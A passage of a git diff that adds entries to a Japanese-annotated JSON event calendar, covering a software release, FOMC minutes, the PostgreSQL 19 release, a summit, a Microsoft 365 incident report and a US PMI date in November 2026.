+      "kind": "release",
+      "note": "git タグの差分で検出",
+      "category": "be"
+    },
+    {
+      "date": "2026-11-18",
+      "title": "FOMC 議事要旨（10 月会合分）公表",
+      "repo": null,
+      "url": "https://coinpost.jp/?p=748370",
+      "kind": "event",
+      "note": "CoinPost の Wintermute レポート記事で日程を確認（米国時間）",
+      "category": "macro"
+    },
+    {
+      "date": "2026-11-19",
+      "title": "PostgreSQL 19 正式リリース（予定）",
+      "repo": "postgres/postgres",
+      "url": "https://www.publickey1.jp/blog/26/postgresql_194ai.html",
+      "kind": "event",
+      "note": "前日の日次ファイルから引き継ぎ（Publickey によると正式版は 11/19 の見通し）",
+      "category": "be"
+    },
+    {
+      "date": "2026-11-19",
+      "title": "米中ロ首脳による初の 3 者会談（深セン）",
+      "repo": null,
+      "url": "https://www.afpbb.com/articles/-/3662415",
+      "kind": "event",
+      "note": "前日の日次ファイルから引き継ぎ（AFP の記事で日程を確認済み）",
+      "category": "macro"
+    },
+    {
+      "date": "2026-11-20",
+      "title": "Microsoft 365 障害の最終版事後レポート（PIR）公開予定",
+      "repo": null,
+      "url": "https://forest.watch.impress.co.jp/docs/news/2156753.html",
+      "kind": "event",
+      "note": "前日の日次ファイルから引き継ぎ（窓の杜の記事で予定日を確認）",
+      "category": "cloud"
+    },
+    {
+      "date": "2026-11-23",
+      "title": "米 11 月 PMI（速報）",
+      "repo": null,
+      "url": "https://coinpost.jp/?p=748038",
+      "kind": "event",
+      "note": "前日の日次ファイルから引き継ぎ（CoinPost の寄稿で日程を確認）",
+      "category": "macro"
+    }
+  ]
+}
